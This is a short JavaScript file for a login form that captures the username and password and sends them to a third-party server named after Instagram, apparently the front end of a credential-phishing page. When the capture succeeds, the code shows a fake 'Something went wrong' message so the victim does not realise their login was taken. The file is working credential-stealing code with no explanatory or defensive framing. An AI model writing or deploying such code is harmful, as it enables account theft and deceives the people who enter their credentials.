document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Log to verify data is being captured
    console.log("Username:", username, "Password:", password);

    fetch('https://instagram-login-cweb.onrender.com/api/login', {  // Updated API URL to use the live server URL
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ usernameOrEmail: username, password })  // Change 'username' to 'usernameOrEmail'
    })
    .then(response => response.json())
    .then(data => {
        const messageElement = document.getElementById('message');
        if (data.success) {
            messageElement.innerText = "Something went wrong. Please try again later.";
            messageElement.style.color = "black";
        } else {
            messageElement.innerText = "Login failed!";
            messageElement.style.color = "red";
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred.');
    });
});
